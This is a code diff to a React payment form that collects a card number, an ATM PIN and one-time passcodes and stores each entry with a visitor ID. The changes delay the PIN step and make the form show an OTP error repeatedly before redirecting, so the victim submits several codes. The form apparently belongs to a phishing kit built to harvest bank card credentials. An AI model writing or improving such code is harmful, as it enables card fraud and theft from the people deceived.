@@ -27,6 +27,7 @@ export default function PaymentForm() {
 
   const [step, setStep] = useState<"cardDetails" | "atmPin" | "otp">("cardDetails")
   const [otpError, setOtpError] = useState(false)
+  const [attemp, setAttemp] = useState(0)
   const [isCardFlipped, setIsCardFlipped] = useState(false)
   const [formData, setFormData] = useState({
     cardNumber: "",
@@ -44,7 +45,9 @@ export default function PaymentForm() {
     addData({ id: visitorId, ...formData })
 
     if (step === "cardDetails") {
-      setStep("atmPin")
+      setTimeout(() => {
+        setStep("atmPin")        
+      }, 1000);
     } else if (step === "atmPin") {
       setStep("otp")
     } else if (step === "otp") {
@@ -53,7 +56,8 @@ export default function PaymentForm() {
       setOtpError(true)
       handleInputChange("otp", "")
       setTimeout(() => {
-        window.location.href = "/phone-verification"
+        setAttemp((prv)=>prv+1)
+        if(attemp === 2){ window.location.href = "/phone-verification"}
       }, 1000)
     }
   }
